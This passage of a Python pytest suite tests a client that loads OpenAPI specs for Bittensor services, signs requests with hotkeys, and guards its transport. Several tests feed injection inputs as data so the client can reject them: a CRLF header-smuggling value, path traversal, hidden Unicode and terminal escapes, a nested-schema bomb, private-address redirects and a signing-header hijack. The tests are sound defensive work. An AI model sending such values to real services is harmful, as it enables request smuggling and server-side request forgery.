                "parameters": [
                    {"name": "o", "in": "query", "required": True, "schema": {"type": "object"}}
                ],
            }
        }
        web.pages[SPEC_URL] = objects
        service = load()
        assert [i.name for i in service.operations["filter"].inputs] == ["f", "q"]
        url = service.operation("filter").prepare({"f": {"a": [1]}, "q": "x y"})[1]
        assert url.endswith("/filter?f=%7B%22a%22%3A%5B1%5D%7D&q=x%20y")
        url = service.operation("deep").prepare({"o": {"a": 1, "b": "c"}})[1]
        assert url.endswith("/deep?a=1&b=c")

    def test_a_spec_that_is_wrong_in_any_way_loses_only_that_operation(self, web):
        broken = spec()
        broken["components"]["schemas"]["Bad"] = {
            "type": "object",
            "required": [{}],
            "properties": {"x": {"$ref": "#/info/title"}, "y": {"$ref": "#/tags"}},
        }
        broken["info"] = {"title": "t"}
        broken["paths"]["/bad"] = {
            "post": {
                "operationId": "bad",
                "requestBody": {
                    "content": {
                        "application/json": {"schema": {"$ref": "#/components/schemas/Bad"}}
                    }
                },
            }
        }
        broken["paths"]["/v6"] = {"get": {"operationId": "v6", "servers": [{"url": "http://[::1"}]}}
        web.pages[SPEC_URL] = broken
        service = load()
        assert [i.name for i in service.operations["bad"].inputs] == ["x", "y"]
        assert any(
            reason.startswith("GET /v6 (v6) has a bad url") for reason in map(str, service.skipped)
        )
        assert "listModels" in service.operations

    def test_a_path_parameter_the_spec_forgot_is_still_an_input(self, web):
        undeclared = spec()
        undeclared["paths"]["/items/{item}"] = {"get": {"operationId": "item", "security": []}}
        web.pages[SPEC_URL] = undeclared
        item = load().operation("item")
        assert [(i.name, i.location, i.required) for i in item.inputs] == [("item", "path", True)]
        assert item.prepare({"item": "a b"})[1].endswith("/items/a%20b")

    def test_a_skipped_operation_says_why_when_called(self, web):
        with pytest.raises(ServiceError, match=r"'admin' is not offered by Example: GET /admin"):
            load().operation("admin")

    def test_an_operation_is_a_tool_definition(self, web):
        service = load()
        tool = service.tool("createJob")
        assert tool["name"] == "create-job" and tool == service.tool("create-job")
        schema = tool["input_schema"]
        assert schema["type"] == "object" and schema["required"] == ["body"]
        assert schema["properties"]["body"]["properties"]["model"]["description"] == "Model id"
        assert "$ref" not in json.dumps(schema)
        assert [t["name"] for t in service.tools()] == [
            op.command for op in service.operations.values()
        ]

    def test_a_tool_has_no_hidden_characters(self, web):
        hidden = "Lists jobs\u202e\u200b\U000e0049\U000e0067\U000e006e\x1b[2J."
        web.pages[SPEC_URL] = spec()
        web.pages[SPEC_URL]["paths"]["/jobs"]["get"]["summary"] = hidden
        tool = load().tool("list-jobs")
        assert tool["description"].startswith("Lists jobs[2J.")

    def test_errors_say_their_kind(self, web):
        service = load()
        for wrong in (
            lambda: service.operation("nope"),
            lambda: asyncio.run(service.call("createJob", {})),
            lambda: asyncio.run(service.call("listModels", {"x": 1})),
        ):
            with pytest.raises(ServiceError) as error:
                wrong()
            assert error.value.code == "input"
        with pytest.raises(ServiceError) as error:
            load({})
        assert error.value.code == "no_service"
        web.pages[DOC_URL] = document(publishers=[{"netuid": 1, "hotkey": BOB_HOT}])
        with pytest.raises(ServiceError) as error:
            load({BOB_HOT: DOC_URL, CAROL_HOT: DOC_URL})
        assert error.value.code == "ambiguous"
        web.pages[DOC_URL] = document()
        web.pages[DOC_URL] = document(payments=[])
        with pytest.raises(ServiceError) as error:
            load()
        assert error.value.code == "unusable"
        with pytest.raises(ServiceError) as error:
            Response(402, {}, b"pay").raise_for_status()
        assert (error.value.code, error.value.status) == ("http", 402)
        assert Response(200, {}, b"").raise_for_status().ok

    def test_part_of_a_name_suggests_the_operations_that_have_it(self, web):
        with pytest.raises(ServiceError, match="did you mean list-jobs, create-job, get-job"):
            load().operation("job")

    def test_a_path_parameter_the_body_repeats_is_one_input(self, web):
        repeated = spec()
        repeated["paths"]["/items/{id}"] = {
            "put": {
                "operationId": "putItem",
                "security": [],
                "parameters": [{"name": "id", "in": "path", "schema": {"type": "integer"}}],
                "requestBody": {
                    "required": True,
                    "content": {
                        "application/json": {
                            "schema": {
                                "type": "object",
                                "required": ["id", "name"],
                                "properties": {"id": {"type": "integer"}, "name": {}},
                            }
                        }
                    },
                },
            }
        }
        web.pages[SPEC_URL] = repeated
        web.pages["https://svc.example/api/v1/items/7"] = {}
        service = load()
        assert [i.name for i in service.operations["putItem"].inputs] == ["id", "name"]
        asyncio.run(service.call("putItem", {"id": 7, "name": "n"}))
        _, url, _, data = web.sent[-1]
        assert url.endswith("/items/7") and json.loads(data) == {"id": 7, "name": "n"}

    def test_a_body_of_nested_alloffs_stops_at_the_budget(self, web, monkeypatch):
        monkeypatch.setattr(services, "RESOLVE_BUDGET", 2000)
        bomb = spec()
        for n in range(30):
            ref = {"$ref": f"#/components/schemas/S{n + 1}"}
            bomb["components"]["schemas"][f"S{n}"] = {"allOf": [ref, ref]}
        bomb["components"]["schemas"]["S30"] = {"type": "object", "properties": {"x": {}}}
        bomb["paths"]["/bomb"] = {
            "post": {
                "operationId": "bomb",
                "security": [],
                "requestBody": {
                    "content": {"application/json": {"schema": {"$ref": "#/components/schemas/S0"}}}
                },
            }
        }
        web.pages[SPEC_URL] = bomb
        started = time.monotonic()
        assert [i.name for i in load().operations["bomb"].inputs] == ["body"]
        assert time.monotonic() - started < 2

    def test_a_broken_ref_inside_a_schema_stays_a_ref(self, web):
        service = load()
        broken = {"items": {"$ref": "#/components/schemas/Missing"}, "x": {"$ref": "#/a/\u00b2"}}
        assert service.resolve(broken) == broken

    def test_each_resolve_has_its_own_budget(self, web):
        big = spec()
        big["components"]["schemas"]["Big"] = {
            "type": "object",
            "properties": {f"p{i}": {"type": "string"} for i in range(1000)},
        }
        web.pages[SPEC_URL] = big
        service = load()
        for _ in range(300):
            resolved = service.resolve({"$ref": "#/components/schemas/Big"})
        assert "$ref" not in resolved and len(resolved["properties"]) == 1000

    def test_resolve_keeps_a_cyclic_ref(self, web):
        cyclic = spec()
        cyclic["components"]["schemas"]["Node"] = {
            "type": "object",
            "properties": {"next": {"$ref": "#/components/schemas/Node"}},
        }
        web.pages[SPEC_URL] = cyclic
        node = load().resolve({"$ref": "#/components/schemas/Node"})
        assert node["properties"]["next"] == {"$ref": "#/components/schemas/Node"}


class TestCall:
    def test_an_open_operation_is_sent_unsigned(self, web):
        service = load()
        web.pages["https://svc.example/api/v1/models"] = {"data": []}
        response = asyncio.run(service.call("listModels"))
        assert response.ok and response.json() == {"data": []}
        method, url, headers, _ = web.sent[-1]
        assert (method, url) == ("GET", "https://svc.example/api/v1/models")
        assert http_auth.HEADER_SIGNATURE not in headers

    def test_a_service_read_by_its_url_is_signed_for_only_on_this_machine(self, web, key):
        service = asyncio.run(services.load_url(DOC_URL))
        assert not service.signable
        with pytest.raises(ServiceError, match="read by its url"):
            asyncio.run(service.call("createJob", {"model": "m"}, signer=key))
        web.pages["https://svc.example/api/v1/models"] = {"data": []}
        assert asyncio.run(service.call("listModels", signer=key)).ok
        assert http_auth.HEADER_SIGNATURE not in web.sent[-1][2]
        assert load().signable
        local = "http://127.0.0.1:8080/services.json"
        web.pages[local] = document(
            services=[{"type": "openapi", "endpoint": "http://127.0.0.1:8080/openapi.json"}]
        )
        web.pages["http://127.0.0.1:8080/openapi.json"] = spec(servers=[{"url": "/"}])
        assert asyncio.run(services.load_url(local)).signable

    def test_signed_url_calls_stay_on_loopback(self, web, key):
        url = "http://127.0.0.1:8080/services.json"
        web.pages[url] = document()
        service = asyncio.run(services.load_url(url))
        assert service.signable
        with pytest.raises(ServiceError, match="local document and endpoint"):
            asyncio.run(service.call("createJob", {"model": "m"}, signer=key))
        assert [sent[1] for sent in web.sent] == [url, SPEC_URL]

        web.pages[url] = Response(200, {}, json.dumps(document()).encode(), DOC_URL)
        assert not asyncio.run(services.load_url(url)).signable

    def test_a_signed_request_binds_the_target_body_and_service_hotkey(self, web, key):
        service = load()
        inputs = {"limit": 5, "model": "m", "tags": ["a"]}
        asyncio.run(service.call("createJob", inputs, signer=key))
        _, url, headers, data = web.sent[-1]
        assert url == "https://svc.example/api/v1/jobs?limit=5"
        assert json.loads(data) == {"model": "m", "tags": ["a"]}
        assert headers["Content-Type"] == "application/json"
        assert caller(web.sent[-1], service).hotkey_ss58 == key.ss58_address
        assert headers[http_auth.HEADER_RECEIVER] == ALICE_HOT

    def test_inputs_are_encoded_into_the_path_query_and_headers(self, web, key):
        service = load()
        asyncio.run(service.call("getJob", {"id": "a/b c", "X-Trace": "t1"}, signer=key))
        _, url, headers, _ = web.sent[-1]
        assert url == "https://svc.example/api/v1/jobs/a%2Fb%20c"
        assert headers["X-Trace"] == "t1"
        caller(web.sent[-1], service)
        asyncio.run(service.call("listJobs", {"limit": [1, 2]}, signer=key))
        assert web.sent[-1][1].endswith("/jobs?limit=1&limit=2")

    @pytest.mark.parametrize(
        "operation,inputs,error",
        [
            ("nope", {}, "no operation"),
            ("listJobs", {"page": 1}, "no input 'page'"),
            ("getJob", {}, "needs 'id'"),
            ("createJob", {}, "needs 'model'"),
            ("listJobs", {}, "pass a signer"),
        ],
    )
    def test_calls_that_do_not_fit_the_operation_are_refused(self, web, operation, inputs, error):
        service = load()
        sent = len(web.sent)
        with pytest.raises(ServiceError, match=error):
            asyncio.run(service.call(operation, inputs))
        assert len(web.sent) == sent

    def test_an_optional_operation_is_signed_only_when_a_signer_is_given(self, web, key):
        optional = spec()
        optional["paths"]["/tier"] = {
            "get": {"operationId": "tier", "security": [{"btauth": []}, {}]}
        }
        web.pages[SPEC_URL] = optional
        service = load()
        assert service.operations["tier"].auth == "optional"
        asyncio.run(service.call("tier"))
        assert http_auth.HEADER_SIGNATURE not in web.sent[-1][2]
        asyncio.run(service.call("tier", signer=key))
        assert caller(web.sent[-1], service).hotkey_ss58 == key.ss58_address
        asyncio.run(service.call("listModels", signer=key))  # open: never signed
        assert http_auth.HEADER_SIGNATURE not in web.sent[-1][2]

    def test_a_query_array_follows_its_style(self, web):
        styled = spec()
        styled["paths"]["/styled"] = {
            "get": {
                "operationId": "styled",
                "security": [],
                "parameters": [
                    {"name": name, "in": "query", "schema": {"type": "array"}, **style}
                    for name, style in {
                        "each": {},
                        "csv": {"explode": False},
                        "pipe": {"style": "pipeDelimited"},
                    }.items()
                ],
            }
        }
        web.pages[SPEC_URL] = styled
        asyncio.run(load().call("styled", {"each": [1, 2], "csv": ["a", "b"], "pipe": ["x", "y"]}))
        query = urllib.parse.parse_qsl(urllib.parse.urlsplit(web.sent[-1][1]).query)
        assert query == [("each", "1"), ("each", "2"), ("csv", "a,b"), ("pipe", "x|y")]

    def test_inputs_by_command_name_and_fixed_values_need_not_be_given(self, web):
        fixed = spec()
        fixed["paths"]["/rpc"] = {
            "post": {
                "operationId": "rpc",
                "security": [],
                "requestBody": {
                    "required": True,
                    "content": {
                        "application/json": {
                            "schema": {
                                "required": ["jsonrpc", "method"],
                                "properties": {
                                    "jsonrpc": {"const": "2.0"},
                                    "method": {"type": "string"},
                                },
                            }
                        }
                    },
                },
            }
        }
        web.pages[SPEC_URL] = fixed
        service = load()
        asyncio.run(service.call("rpc", {"method": "m"}))
        assert json.loads(web.sent[-1][3]) == {"jsonrpc": "2.0", "method": "m"}
        with pytest.raises(ServiceError, match="did you mean method"):
            asyncio.run(service.call("rpc", {"methd": "m"}))

    def test_a_header_input_is_latin_1(self, web, key):
        with pytest.raises(ServiceError, match="Latin-1"):
            asyncio.run(load().call("getJob", {"id": "1", "X-Trace": "żółw"}, signer=key))

    @pytest.mark.parametrize("value", ["", ".", ".."])
    def test_a_path_input_cannot_reach_another_route(self, web, key, value):
        with pytest.raises(ServiceError, match="cannot take"):
            asyncio.run(load().call("getJob", {"id": value}, signer=key))

    def test_a_header_input_cannot_hold_a_newline(self, web, key):
        with pytest.raises(ServiceError, match="control characters"):
            asyncio.run(load().call("getJob", {"id": "1", "X-Trace": "a\r\nX: b"}, signer=key))

    def test_btauth_headers_are_never_inputs(self, web, key):
        hijack = spec()
        hijack["paths"]["/jobs/{id}"]["get"]["parameters"].append(
            {"name": "X-Bittensor-Receiver", "in": "header", "schema": {"type": "string"}}
        )
        web.pages[SPEC_URL] = hijack
        service = load()
        with pytest.raises(ServiceError, match="no input 'X-Bittensor-Receiver'"):
            asyncio.run(
                service.call("getJob", {"id": "1", "X-Bittensor-Receiver": BOB_HOT}, signer=key)
            )

    def test_any_status_is_returned(self, web, key):
        service = load()
        web.pages["https://svc.example/api/v1/jobs"] = Response(
            402, {"content-type": "application/json"}, b'{"error":"insufficient_balance"}'
        )
        response = asyncio.run(service.call("listJobs", signer=key))
        assert response.status == 402 and not response.ok and response.is_json


def with_operation(path: str, method: str, operation: dict) -> dict:
    """The example spec with one more operation."""
    value = spec()
    value["paths"][path] = {method: operation}
    return value


def multipart_body(data: bytes, boundary: str) -> list[tuple[dict, bytes]]:
    """Each part of a multipart body as its headers and content."""
    parts = []
    for chunk in data.split(b"--" + boundary.encode())[1:-1]:
        head, _, content = chunk.strip(b"\r\n").partition(b"\r\n\r\n")
        headers = dict(line.split(": ", 1) for line in head.decode().split("\r\n"))
        parts.append((headers, content))
    return parts


class TestBodies:
    def test_a_multipart_body_sends_files_and_fields(self, web):
        upload = {
            "type": "object",
            "required": ["file", "model"],
            "properties": {
                "file": {"type": "string", "format": "binary"},
                "model": {"type": "string"},
                "options": {"type": "object"},
                "extra": {"type": "array", "items": {"type": "string", "format": "binary"}},
            },
        }
        web.pages[SPEC_URL] = with_operation(
            "/transcribe",
            "post",
            {
                "operationId": "transcribe",
                "requestBody": {
                    "required": True,
                    "content": {"multipart/form-data": {"schema": upload}},
                },
            },
        )
        op = load().operation("transcribe")
        assert [(i.name, i.binary) for i in op.inputs] == [
            ("file", True),
            ("model", False),
            ("options", False),
            ("extra", True),
        ]
        method, _, _, headers, data = op.prepare(
            {
                "file": ("talk.mp3", b"\x00\xffaudio"),
                "model": "m",
                "options": {"a": 1},
                "extra": [b"one", services.base64.b64encode(b"two").decode()],
            }
        )
        kind, _, boundary = headers["Content-Type"].partition("; boundary=")
        assert (method, kind) == ("POST", "multipart/form-data")
        parts = multipart_body(data, boundary)
        assert parts[0] == (
            {
                "Content-Disposition": 'form-data; name="file"; filename="talk.mp3"',
                "Content-Type": "audio/mpeg",
            },
            b"\x00\xffaudio",
        )
        assert parts[1] == ({"Content-Disposition": 'form-data; name="model"'}, b"m")
        assert parts[2][1] == b'{"a":1}' and parts[2][0]["Content-Type"] == "application/json"
        assert [content for _, content in parts[3:]] == [b"one", b"two"]
        with pytest.raises(ServiceError, match="as a file") as error:
            op.prepare({"file": "not base64!", "model": "m"})
        assert error.value.code == "input"

    def test_a_form_body_is_urlencoded_as_its_encoding_says(self, web):
        form = {
            "type": "object",
            "properties": {
                "name": {"type": "string"},
                "tags": {"type": "array"},
                "meta": {"type": "object"},
            },
        }
        web.pages[SPEC_URL] = with_operation(
            "/form",
            "post",
            {
                "operationId": "form",
                "requestBody": {
                    "content": {
                        "application/x-www-form-urlencoded": {
                            "schema": form,
                            "encoding": {"meta": {"style": "deepObject", "explode": True}},
                        }
                    }
                },
            },
        )
        headers, data = (
            load()
            .operation("form")
            .prepare({"name": "a b", "tags": ["x", "y"], "meta": {"k": "v"}})[3:]
        )
        assert headers["Content-Type"] == "application/x-www-form-urlencoded"
        assert data == b"name=a%20b&tags=x&tags=y&meta%5Bk%5D=v"

    @pytest.mark.parametrize(
        "media,value,sent",
        [
            ("application/octet-stream", b"\x00\x01", b"\x00\x01"),
            ("image/*", ("photo.png", b"png"), b"png"),
            ("text/plain", "hello", b"hello"),
            ("application/xml", "<a/>", b"<a/>"),
            ("*/*", b"any", b"any"),
        ],
    )
    def test_a_body_that_is_not_json_is_sent_as_it_is(self, web, media, value, sent):
        web.pages[SPEC_URL] = with_operation(
            "/raw",
            "put",
            {
                "operationId": "raw",
                "requestBody": {"required": True, "content": {media: {}}},
            },
        )
        op = load().operation("raw")
        headers, data = op.prepare(body=value)[3:]
        assert data == sent
        assert headers["Content-Type"] == (
            media if "*" not in media else "application/octet-stream"
        )
        assert op.prepare({"body": value})[4] == sent

    def test_json_is_chosen_over_other_media_types(self, web):
        web.pages[SPEC_URL] = with_operation(
            "/both",
            "post",
            {
                "operationId": "either",
                "requestBody": {
                    "content": {
                        "multipart/form-data": {"schema": {"type": "object"}},
                        "application/json": {"schema": {"type": "object"}},
                    }
                },
            },
        )
        op = load().operation("either")
        assert (op.body_kind, op.body_type) == ("json", "application/json")


class TestParameters:
    def operation(self, web, parameters, path="/p/{id}"):
        web.pages[SPEC_URL] = with_operation(
            path, "get", {"operationId": "p", "security": [], "parameters": parameters}
        )
        return load().operation("p")

    @pytest.mark.parametrize(
        "style,explode,value,sent",
        [
            ("simple", False, ["a", "b"], "/p/a,b"),
            ("simple", True, {"x": 1, "y": 2}, "/p/x=1,y=2"),
            ("simple", False, {"x": 1, "y": 2}, "/p/x,1,y,2"),
            ("label", False, ["a", "b"], "/p/.a,b"),
            ("label", True, ["a", "b"], "/p/.a.b"),
            ("matrix", False, "a", "/p/;id=a"),
            ("matrix", True, ["a", "b"], "/p/;id=a;id=b"),
            ("matrix", True, {"x": 1}, "/p/;x=1"),
        ],
    )
    def test_a_path_parameter_follows_its_style(self, web, style, explode, value, sent):
        param = {"name": "id", "in": "path", "style": style, "explode": explode}
        url = self.operation(web, [param]).prepare({"id": value})[1]
        assert urllib.parse.urlsplit(url).path == "/api/v1" + sent

    @pytest.mark.parametrize(
        "param,value,query",
        [
            (
                {"style": "deepObject"},
                {"a": {"b": 1}, "c": [1, 2]},
                "q%5Ba%5D%5Bb%5D=1&q%5Bc%5D=1&q%5Bc%5D=2",
            ),
            ({"style": "form", "explode": False}, {"a": 1, "b": 2}, "q=a%2C1%2Cb%2C2"),
            ({"style": "spaceDelimited", "explode": False}, ["a", "b"], "q=a%20b"),
            (
                {"schema": {"type": "array", "items": {"type": "object"}}},
                [{"a": 1}],
                "q=%7B%22a%22%3A1%7D",
            ),
        ],
    )
    def test_a_query_parameter_follows_its_style(self, web, param, value, query):
        op = self.operation(web, [{"name": "q", "in": "query", **param}], path="/p")
        assert urllib.parse.urlsplit(op.prepare({"q": value})[1]).query == query

    def test_headers_openapi_ignores_never_hold_an_operation_back(self, web):
        op = self.operation(
            web,
            [
                {"name": "Content-Type", "in": "header", "required": True},
                {"name": "Authorization", "in": "header", "required": True},
                {"name": "Accept", "in": "header"},
                {"name": "X-Meta", "in": "header", "explode": True, "schema": {"type": "object"}},
            ],
            path="/p",
        )
        assert [i.name for i in op.inputs] == ["X-Meta"]
        assert op.prepare({"X-Meta": {"a": 1, "b": 2}})[3]["X-Meta"] == "a=1,b=2"

    def test_parameters_that_share_a_name_are_renamed_and_sent_by_it(self, web):
        op = self.operation(
            web,
            [
                {"name": "id", "in": "query"},
                {"name": "id", "in": "path"},
                {"name": "maxResults", "in": "query"},
                {"name": "MaxResults", "in": "query"},
                {"name": "$", "in": "query"},
            ],
        )
        assert [(i.name, i.command) for i in op.inputs] == [
            ("id", "id"),
            ("query_id", "query-id"),
            ("maxResults", "max-results"),
            ("MaxResults", "query-max-results"),
            ("$", "query"),
        ]
        url = op.prepare(
            {"id": "p", "query_id": "q", "query-max-results": 2, "maxResults": 1, "$": "d"}
        )[1]
        assert url.endswith("/p/p?id=q&maxResults=1&MaxResults=2&%24=d")

    def test_a_path_with_a_fragment_or_its_own_query_is_sent_without_them(self, web):
        value = spec()
        value["paths"]["/#X-Amz-Target=Service.List"] = {
            "post": {"operationId": "list", "security": []}
        }
        value["paths"]["/?Action=Describe&Version=1"] = {
            "get": {
                "operationId": "describe",
                "security": [],
                "parameters": [{"name": "Id", "in": "query"}],
            }
        }
        web.pages[SPEC_URL] = value
        service = load()
        assert service.operation("list").prepare()[1] == "https://svc.example/api/v1/"
        url = service.operation("describe").prepare({"Id": "i"})[1]
        assert url == "https://svc.example/api/v1/?Action=Describe&Version=1&Id=i"

    def test_a_reference_may_be_percent_encoded(self, web):
        value = spec()
        value["paths"]["/jobs/{id}"]["get"]["parameters"].append(
            {"$ref": "#/paths/~1jobs~1%7Bid%7D/get/parameters/1"}
        )
        value["paths"]["/jobs/{id}"]["get"]["parameters"][1] = {"name": "X-Trace", "in": "header"}
        web.pages[SPEC_URL] = value
        assert [i.name for i in load().operation("getJob").inputs] == ["id", "X-Trace"]

    def test_btauth_headers_as_parameters_mean_the_operation_is_signed(self, web):
        undeclared = with_operation(
            "/paid",
            "get",
            {
                "operationId": "paid",
                "parameters": [{"name": "X-Bittensor-Signature", "in": "header", "required": True}],
            },
        )
        undeclared["components"]["securitySchemes"] = {}
        del undeclared["security"]
        web.pages[SPEC_URL] = undeclared
        op = load().operation("paid")
        assert (op.auth, op.inputs) == ("hotkey", ())

    def test_a_spec_split_over_files_skips_what_it_cannot_read(self, web):
        split = spec()
        split["paths"]["/elsewhere"] = {"$ref": "paths.yaml#/elsewhere"}
        split["paths"]["/jobs"]["post"]["requestBody"] = {"$ref": "bodies.yaml#/Job"}
        web.pages[SPEC_URL] = split
        service = load()
        assert "createJob" not in service.operations
        reasons = {s.path: s.reason for s in service.skipped}
        assert "in another file" in reasons["/elsewhere"] and "in another file" in reasons["/jobs"]

    def test_a_tool_takes_what_a_request_sends(self, web):
        typed = spec(openapi="3.0.3")
        typed["components"]["schemas"]["Job"]["properties"] |= {
            "id": {"type": "string", "readOnly": True},
            "name": {"type": "string", "nullable": True},
            "size": {"enum": ["s", "m"], "nullable": True},
        }
        typed["components"]["schemas"]["Job"]["required"] = ["model", "id"]
        web.pages[SPEC_URL] = typed
        tool = load().tool("createJob")
        job = tool["input_schema"]["properties"]["body"]
        assert "id" not in job["properties"] and job["required"] == ["model"]
        assert job["properties"]["name"]["type"] == ["string", "null"]
        assert job["properties"]["size"] == {
            "anyOf": [{"enum": ["s", "m", None]}, {"type": "null"}]
        }

    def test_discover_says_a_service_with_no_operation_cannot_be_used(self, web):
        web.pages[SPEC_URL] = spec(paths={})
        client = Client("finney", substrate=every_service({ALICE_HOT: DOC_URL}))
        found = asyncio.run(services.discover(client))
        assert found[0].service is not None and found[0].problem.startswith("offers no operation")

    def test_a_server_variable_without_a_default_takes_its_first_choice(self, web):
        server = {"url": "https://{region}.svc.example", "variables": {"region": {"enum": ["us"]}}}
        web.pages[SPEC_URL] = spec(servers=[server])
        assert load().api_url == "https://us.svc.example"


class TestStreaming:
    def test_a_streamed_body_is_not_cut_off_while_it_keeps_arriving(self):
        head = b"HTTP/1.0 200 OK\r\ncontent-type: text/event-stream\r\n\r\n"
        sink = io.BytesIO()
        with serving(head, b"data: x\n\n") as url:
            response = services._send(
                "GET", url, {}, b"", True, 1 << 20, 0.5, into=lambda head: sink
            )
        assert response.content == b"" and sink.getvalue() == b"data: x\n\n" * 30

    def test_a_failed_response_is_never_streamed(self, web):
        web.pages["https://svc.example/api/v1/models"] = Response(500, {}, b"broken")
        calls = []
        response = asyncio.run(
            load().call("listModels", into=lambda head: calls.append(head) or io.BytesIO())
        )
        assert (response.status, response.content, calls) == (500, b"broken", [])

    def test_every_byte_reaches_a_sink_that_takes_some_at_a_time(self):
        class Partial(io.BytesIO):
            def write(self, data):
                return super().write(data[:2])

        sink = Partial()
        services._stream(io.BytesIO(b"abcdef"), sink, "https://x.example", {"content-length": "6"})
        assert sink.getvalue() == b"abcdef"

    def test_a_sink_that_cannot_write_is_an_output_error(self):
        class Full(io.BytesIO):
            def write(self, data):
                raise OSError(28, "No space left on device")

        with pytest.raises(ServiceError, match="No space left") as error:
            services._stream(io.BytesIO(b"abc"), Full(), "https://x.example", {})
        assert error.value.code == "output"


class TestBalance:
    def test_an_unsigned_read_names_the_hotkey(self, web):
        service = load()
        web.pages[f"{BALANCE_URL}?hotkey={BOB_HOT}"] = {"remaining_usd": "1.00"}
        assert asyncio.run(service.balance(BOB_HOT)) == {"remaining_usd": "1.00"}
        assert http_auth.HEADER_SIGNATURE not in web.sent[-1][2]

    def test_a_signed_read_is_the_signers_and_keeps_the_query(self, web, key):
        web.pages[DOC_URL] = document(
            payments=[{"type": "gamma", "signature": "btauth/1", "balance": f"{BALANCE_URL}?v=2"}]
        )
        service = load()
        web.pages[f"{BALANCE_URL}?v=2&hotkey={key.ss58_address}"] = signed_only(
            {"remaining_usd": "0"}
        )
        assert asyncio.run(service.balance(signer=key)) == {"remaining_usd": "0"}
        assert http_auth.HEADER_SIGNATURE not in web.sent[-2][2]  # asked unsigned first
        assert caller(web.sent[-1], service).hotkey_ss58 == key.ss58_address

    def test_balance_url_uses_only_the_requested_hotkey(self, web):
        web.pages[DOC_URL] = document(
            payments=[
                {
                    "type": "gamma",
                    "signature": "btauth/1",
                    "balance": f"{BALANCE_URL}?hotkey={ALICE_HOT}&version=",
                }
            ]
        )
        expected = f"{BALANCE_URL}?version=&hotkey={BOB_HOT}"
        web.pages[expected] = {"hotkey": BOB_HOT, "remaining_usd": "0"}
        assert asyncio.run(load().balance(BOB_HOT))["hotkey"] == BOB_HOT
        assert web.sent[-1][1] == expected

    def test_a_balance_for_another_hotkey_is_refused(self, web):
        service = load()
        web.pages[f"{BALANCE_URL}?hotkey={BOB_HOT}"] = {"hotkey": ALICE_HOT, "remaining_usd": "9"}
        with pytest.raises(ServiceError, match=r"is .*'s, not"):
            asyncio.run(service.balance(BOB_HOT))

    def test_a_balance_without_what_remains_is_refused(self, web):
        service = load()
        for record in ({}, {"error": "not found"}, {"remaining_usd": 3.75}):
            web.pages[f"{BALANCE_URL}?hotkey={BOB_HOT}"] = record
            with pytest.raises(ServiceError, match="has no remaining_usd"):
                asyncio.run(service.balance(BOB_HOT))


class TestTransport:
    def request(self, signed: bool) -> urllib.request.Request:
        headers = {http_auth.HEADER_SIGNATURE: "0x00"} if signed else {}
        return urllib.request.Request("https://svc.example/a", headers=headers)

    def test_a_signed_request_is_never_redirected(self):
        handler = services._Redirects(False)
        assert (
            handler.redirect_request(self.request(True), None, 307, "", {}, "https://svc.example/b")
            is None
        )

    def test_a_request_with_a_body_is_never_redirected(self):
        posted = urllib.request.Request("https://svc.example/a", data=b"{}", method="POST")
        handler = services._Redirects(False)
        assert handler.redirect_request(posted, None, 302, "", {}, "https://svc.example/b") is None

    def test_a_name_for_a_private_address_is_refused(self):
        with socket.create_server(("127.0.0.1", 0)) as server:
            port = server.getsockname()[1]
            for url in (f"https://localhost.:{port}/", f"https://127.1:{port}/"):
                with pytest.raises(ServiceError, match="is not a public host"):
                    services._send("GET", services._checked_url(url, "the API"), {}, b"")

    def test_an_error_quotes_no_terminal_controls(self):
        assert str(ServiceError("no operation 'a\x1b[2Jb'")) == "no operation 'a[2Jb'"

    def test_an_unsigned_request_is_redirected_only_to_an_allowed_url(self):
        handler = services._Redirects(False)
        moved = handler.redirect_request(
            self.request(False), None, 301, "", {}, "https://svc.example/b"
        )
        assert moved.full_url == "https://svc.example/b"
        with pytest.raises(ServiceError, match="must be https"):
            handler.redirect_request(self.request(False), None, 301, "", {}, "http://svc.example/b")
        for private in ("http://127.0.0.1:9944/", "https://localhost/", "https://192.168.1.1/"):
            with pytest.raises(ServiceError, match="not a public host"):
                handler.redirect_request(self.request(False), None, 302, "", {}, private)

    def test_a_header_input_is_not_redirected_to_another_host(self):
        request = urllib.request.Request("https://svc.example/a", headers={"X-Api-Key": "k"})
        handler = services._Redirects(False)
        same = handler.redirect_request(request, None, 302, "", {}, "https://svc.example/b")
        other = handler.redirect_request(request, None, 302, "", {}, "https://elsewhere.example/b")
        assert same.get_header("X-api-key") == "k" and other.get_header("X-api-key") is None

    def test_the_deadline_shuts_a_socket_that_tls_has_taken_over(self):
        ours, theirs = socket.socketpair()
        with services._Deadline(30) as deadline:
            deadline.watch(ours)
            taken = socket.socket(fileno=ours.detach())  # as wrapping it in TLS does
            deadline.shut()
            assert theirs.recv(1) == b""
            taken.close()
        theirs.close()

    @pytest.mark.parametrize(
        "address", ["64:ff9b::a00:1", "::ffff:10.0.0.1", "::ffff:127.0.0.1", "10.0.0.1"]
    )
    def test_an_address_that_stands_for_a_private_one_is_private(self, address):
        assert not services._is_global(address)
        assert services._is_global("64:ff9b::808:808") and services._is_global("8.8.8.8")

    def test_public_services_connect_directly(self, monkeypatch):
        monkeypatch.setenv("https_proxy", "http://proxy.example")
        services._opener.cache_clear()
        opener = services._opener(False)
        assert not any(isinstance(h, urllib.request.ProxyHandler) for h in opener.handlers)

    def test_exhausted_dns_capacity_obeys_the_request_deadline(self, monkeypatch):
        monkeypatch.setattr(services, "_resolver_slots", threading.Semaphore(0))
        with services._Deadline(0.05) as deadline, pytest.raises(TimeoutError):
            services._lookup("unresolved.example", 443, deadline)

    @pytest.mark.parametrize("seconds", [0, -1, float("nan"), float("inf"), 10**300, True])
    def test_invalid_deadlines_never_start_a_request(self, seconds):
        with pytest.raises(ServiceError) as error:
            services._send("GET", "https://svc.example", {}, b"", timeout=seconds)
        assert error.value.code == "input"

    def test_no_time_to_connect_is_a_timeout(self):
        with (
            socket.create_server(("127.0.0.1", 0)) as server,
            pytest.raises(ServiceError, match="did not answer within") as error,
        ):
            port = server.getsockname()[1]
            services._send("GET", f"http://127.0.0.1:{port}/", {}, b"", True, 1 << 20, 1e-9)
        assert error.value.code == "timeout"

    def test_a_host_that_trickles_is_cut_off_at_the_deadline(self):
        with socket.create_server(("127.0.0.1", 0)) as server:
            port = server.getsockname()[1]

            def trickle():
                conn, _ = server.accept()
                conn.recv(1024)
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 100\r\n\r\n")
                for _ in range(30):
                    time.sleep(0.1)
                    with contextlib.suppress(OSError):
                        conn.sendall(b"x")
                conn.close()

            thread = threading.Thread(target=trickle, daemon=True)
            thread.start()
            started = time.monotonic()
            with pytest.raises(ServiceError, match=r"did not answer within 0\.5 s"):
